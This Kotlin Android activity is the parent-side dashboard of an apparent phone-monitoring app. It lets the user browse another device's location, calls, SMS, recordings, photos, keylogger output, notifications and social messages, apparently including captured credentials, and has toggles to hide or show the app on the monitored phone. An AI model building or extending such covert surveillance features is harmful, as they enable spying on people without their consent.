package com.example.rule.dash.ui.activities.mainparent

import android.Manifest.permission.READ_EXTERNAL_STORAGE
import android.Manifest.permission.WRITE_EXTERNAL_STORAGE
import android.annotation.SuppressLint
import android.app.Activity
import android.content.Intent
import android.os.Bundle
import com.google.android.material.navigation.NavigationView
import androidx.core.view.GravityCompat
import androidx.core.view.ViewCompat
import androidx.drawerlayout.widget.DrawerLayout
import androidx.appcompat.widget.PopupMenu
import android.view.MenuItem
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import cn.pedant.SweetAlert.SweetAlertDialog
import com.example.rule.dash.R
import com.example.rule.dash.data.model.Child
import com.example.rule.dash.data.preference.DataSharePreference.childSelected
import com.example.rule.dash.data.preference.DataSharePreference.clearAll
import com.example.rule.dash.data.preference.DataSharePreference.deviceChildSelected
import com.example.rule.dash.ui.activities.base.BaseActivity
import com.example.rule.dash.ui.activities.login.LoginActivity
import com.example.rule.dash.utils.ConstFun.startAnimateActivity
import com.example.rule.dash.utils.Consts.CALLS
import com.example.rule.dash.utils.Consts.DATA
import com.example.rule.dash.utils.Consts.KEY_LOGGER
import com.example.rule.dash.utils.Consts.PHOTO
import com.example.rule.dash.utils.Consts.SMS
import com.example.rule.dash.data.preference.DataSharePreference.finishAppState
import com.example.rule.dash.data.preference.DataSharePreference.listChild
import com.example.rule.dash.data.preference.DataSharePreference.lockPin
import com.example.rule.dash.data.preference.DataSharePreference.lockState
import com.example.rule.dash.ui.activities.lock.LockActivity
import com.example.rule.dash.ui.fragments.base.IOnFragmentListener
import com.example.rule.dash.ui.fragments.calls.CallsFragment
import com.example.rule.dash.ui.fragments.keylog.KeysFragment
import com.example.rule.dash.ui.fragments.maps.MapsFragment
import com.example.rule.dash.ui.fragments.message.MessageFragment
import com.example.rule.dash.ui.fragments.notifications.NotifyMessageFragment
import com.example.rule.dash.ui.fragments.photo.PhotoFragment
import com.example.rule.dash.ui.fragments.recording.RecordingFragment
import com.example.rule.dash.ui.fragments.setting.SettingFragment
import com.example.rule.dash.ui.fragments.social.SocialFragment
import com.example.rule.dash.utils.Consts.RECORDING
import com.example.rule.dash.utils.FileHelper.deleteAllFile
import com.example.rule.dash.utils.FileHelper.getUriPath
import com.pawegio.kandroid.longToast
import com.example.rule.dash.utils.ConstFun.find
import com.example.rule.dash.utils.ConstFun.listToStringChild
import com.example.rule.dash.utils.ConstFun.openGallery
import com.example.rule.dash.utils.ConstFun.startMain
import com.example.rule.dash.utils.ConstFun.stringToListChild
import com.example.rule.dash.utils.Consts.ADDRESS_AUDIO_CALLS
import com.example.rule.dash.utils.Consts.ADDRESS_AUDIO_RECORD
import com.example.rule.dash.utils.Consts.CHILD_NAME
import com.example.rule.dash.utils.Consts.CHILD_PHOTO
import com.example.rule.dash.utils.Consts.CHILD_SHOW_APP
import com.example.rule.dash.utils.Consts.CHILD_SOCIAL_MS
import com.example.rule.dash.utils.Consts.DEVICE_NAME
import com.example.rule.dash.utils.Consts.NOTIFICATION_MESSAGE
import com.example.rule.dash.utils.Consts.SOCIAL
import com.example.rule.dash.utils.Consts.TAG
import com.example.rule.dash.utils.Dialogs.showDialogAccount
import com.example.rule.dash.utils.HomeWatcher
import com.google.firebase.database.DataSnapshot
import com.pawegio.kandroid.e
import kotterknife.bindView
import java.io.File
import javax.inject.Inject

class MainParentActivity : BaseActivity(R.layout.activity_main_parent), InterfaceViewMainParent, NavigationView.OnNavigationItemSelectedListener, HomeWatcher.OnHomePressedListener {

    private val drawerLayout : DrawerLayout by bindView(R.id.drawer_layout)
    private val navView : NavigationView by bindView(R.id.nav_view)

    private var homeWatcher: HomeWatcher?=null

    @Inject lateinit var interactorParent: InterfaceInteractorMainParent<InterfaceViewMainParent>

    private var dialog : AlertDialog ?= null
    private var fragmentTag : String = MapsFragment.TAG

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (lockState && lockPin != "") { startAnimateActivity<LockActivity>() ; initializeHomeWatcher() }
        windowLightStatusBar()
        getComponent()!!.inject(this)
        interactorParent.onAttach(this)
        interactorParent.initializeCountDownTimer()
        initializeDrawerLayout()
    }

    private fun initializeHomeWatcher(){
        homeWatcher = HomeWatcher(this, this)
        homeWatcher?.startWatch()
    }

    override fun onHomePressed() = finishAndRemoveTask()

    override fun onRecentApps() = finishAndRemoveTask()

    override fun onPostCreate(savedInstanceState: Bundle?) {
        super.onPostCreate(savedInstanceState)
        interactorParent.valueAccounts(childSelected=="")
        intent.getStringExtra("TAG")?.let { setFragmentTag(it) }
        setDataUser()
        if (finishAppState) interactorParent.startCountDownTimer()
    }

    private fun setDataUser(){
        val user = interactorParent.getUser()
        if (user!=null){
            val header = navView.getHeaderView(0)
            val child = header.find<TextView>(R.id.child_header)
            val email = header.find<TextView>(R.id.mail_header)
            val device = header.find<TextView>(R.id.device_header)
            email.text = user.email
            child.text = childSelected
            device.text = deviceChildSelected
        }
    }

    override fun setDataAccounts(data: DataSnapshot) {
        val list : MutableList<Child> = mutableListOf()
        for (child : DataSnapshot in data.children){
            val name = child.child("$DATA/$CHILD_NAME").value
            val photoUrl = child.child("$DATA/$CHILD_PHOTO").value
            val nameDevice = child.child("$DATA/$DEVICE_NAME").value
            list.add(Child(name.toString(),photoUrl.toString(),nameDevice.toString()))
        }
        listChild = listToStringChild(list)
        if (childSelected==""){
            hideDialog()
            if (dialog != null) dialog!!.dismiss()
            dialog = showDialogAccount(list,false){ it!!.dismiss() ; startMain(MapsFragment.TAG) }
        }

    }

    override fun changeChild(fragmentTag:String) {
        super.changeChild(fragmentTag)
        this.fragmentTag = fragmentTag
        dialog = showDialogAccount(stringToListChild(listChild),clickChangePhoto = { checkPermissionStorage() }){
            it?.dismiss() ; startMain(fragmentTag)
        }
    }

    @SuppressLint("CheckResult")
    private fun checkPermissionStorage(){
        getPermissions()!!.requestEachCombined(WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE)
                .subscribe ({permission ->
                    subscribePermission(permission,getString(R.string.message_permission_storage), getString(R.string.message_permission_never_ask_again_storage)){
                        openGallery()
                    }
                },{error -> e(TAG,error.message.toString())})
    }

    override fun onUserInteraction() {
        if (finishAppState) interactorParent.restartCountDownTimer()
        super.onUserInteraction()
    }

    private fun initializeDrawerLayout(){
        navView.setNavigationItemSelectedListener(this)
    }

    override fun openDrawer() {
        drawerLayout.openDrawer(GravityCompat.START)
    }

    override fun setMenu(menu: PopupMenu?) {
        menu?.setOnMenuItemClickListener { item ->
            when (item.itemId) {
                R.id.nav_sign_out-> interactorParent.signOut()
                R.id.nav_show_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(true)
                R.id.nav_hide_app -> interactorParent.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(false)
                R.id.nav_clear_keylogger -> showDialogClearLogList(R.string.message_dialog_clear_keylogger,"$KEY_LOGGER/$DATA")
                R.id.nav_clear_calls -> showDialogClearLogList(R.string.message_dialog_clear_calls,"$CALLS/$DATA"){ deleteAllFile(ADDRESS_AUDIO_CALLS) }
                R.id.nav_clear_sms -> showDialogClearLogList(R.string.message_dialog_clear_sms,"$SMS/$DATA")
                R.id.nav_clear_photo -> showDialogClearLogList(R.string.message_dialog_clear_photos,"$PHOTO/$DATA")
                R.id.nav_clear_social -> showDialogClearLogList(R.string.message_dialog_clear_credentials,"$SOCIAL/$CHILD_SOCIAL_MS")
                R.id.nav_clear_records -> showDialogClearLogList(R.string.message_dialog_clear_record,"$RECORDING/$DATA"){ deleteAllFile(ADDRESS_AUDIO_RECORD) }
                R.id.nav_clear_notifications-> showDialogClearLogList(R.string.message_dialog_clear_notifications,"$NOTIFICATION_MESSAGE/$DATA")
            }
            return@setOnMenuItemClickListener true
        }
    }

    override fun onNavigationItemSelected(p0: MenuItem): Boolean {
        closeNavigationDrawer()
        when(p0.itemId){
            R.id.nav_location-> if (!p0.isChecked) setFragmentTag(MapsFragment.TAG)
            R.id.nav_calls-> if (!p0.isChecked) setFragmentTag(CallsFragment.TAG)
            R.id.nav_messages-> if (!p0.isChecked) setFragmentTag(MessageFragment.TAG)
            R.id.nav_records-> if (!p0.isChecked) setFragmentTag(RecordingFragment.TAG)
            R.id.nav_photographic-> if (!p0.isChecked) setFragmentTag(PhotoFragment.TAG)
            R.id.nav_keylog-> if (!p0.isChecked) setFragmentTag(KeysFragment.TAG)
            R.id.nav_social-> if (!p0.isChecked) setFragmentTag(SocialFragment.TAG)
            R.id.nav_notifications -> if (!p0.isChecked) setFragmentTag(NotifyMessageFragment.TAG)
            R.id.nav_setting-> if (!p0.isChecked) setFragmentTag(SettingFragment.TAG)
        }
        return true
    }

    private fun setFragmentTag(fragmentTag: String){
        when(fragmentTag){
            MapsFragment.TAG -> interactorParent.setFragmentLocation()
            CallsFragment.TAG -> interactorParent.setFragmentCalls()
            MessageFragment.TAG ->  interactorParent.setFragmentSms()
            RecordingFragment.TAG ->  interactorParent.setFragmentRecords()
            PhotoFragment.TAG ->  interactorParent.setFragmentPhotos()
            KeysFragment.TAG ->  interactorParent.setFragmentKeylog()
            NotifyMessageFragment.TAG ->  interactorParent.setFragmentNotifyMessage()
            SocialFragment.TAG ->  interactorParent.setFragmentSocial()
            SettingFragment.TAG ->  interactorParent.setFragmentSetting()
        }
    }

    override fun closeNavigationDrawer() {
        drawerLayout.closeDrawer(GravityCompat.START)
    }

    override fun setDrawerLock() {
        drawerLayout.setDrawerLockMode(DrawerLayout.LOCK_MODE_LOCKED_CLOSED)
    }

    override fun setDrawerUnLock() {
        drawerLayout.setDrawerLockMode(DrawerLayout.LOCK_MODE_UNLOCKED)
    }

    override fun requestApplyInsets() {
        ViewCompat.requestApplyInsets(drawerLayout)
    }

    override fun setCheckedNavigationItem(id: Int) {
        navView.menu.findItem(id).isChecked = true
    }

    private fun showDialogClearLogList(msg:Int,child:String,action:(()->Unit)?=null){
        showDialog(SweetAlertDialog.WARNING_TYPE,R.string.title_dialog,getString(msg),R.string.clear,true){
            setConfirmClickListener {
                interactorParent.getDatabaseReference(child).removeValue()
                if (action!=null) action()
                hideDialog()
            }
            show()
        }
    }

    override fun signOutView() {
        clearAll()
        startAnimateActivity<LoginActivity>(R.anim.fade_in,R.anim.fade_out)
    }

    override fun successResult(result: Boolean, filter:Boolean) {
        hideDialog()
        if (result) startMain(fragmentTag)
    }

    override fun failedResult(throwable: Throwable) {
        hideDialog()
        showMessage(throwable.message.toString())
    }

    override fun onFinishCount() {
        longToast(getString(R.string.closed_for_inactivity))
        finishAndRemoveTask()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 100 && resultCode == Activity.RESULT_OK){
            try {
                if (data!=null) {
                    if (dialog!=null) dialog!!.dismiss()
                    interactorParent.uploadPhotoChild(File(data.data!!.getUriPath(this)))
                }
            } catch (t:Throwable){
                showMessage(t.message.toString())
                e(TAG,t.message.toString())
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        val fragment = supportFragmentManager.findFragmentById(R.id.frame_main)
        (fragment as? IOnFragmentListener)?.onBackPressed()?.let {
            if (!it) when{
                drawerLayout.isDrawerOpen(GravityCompat.START) -> closeNavigationDrawer()
                else -> super.onBackPressed()
            }
        }
    }

    override fun onDestroy() {
        interactorParent.onDetach()
        if (homeWatcher!=null) homeWatcher?.stopWatch()
        super.onDestroy()
    }

}
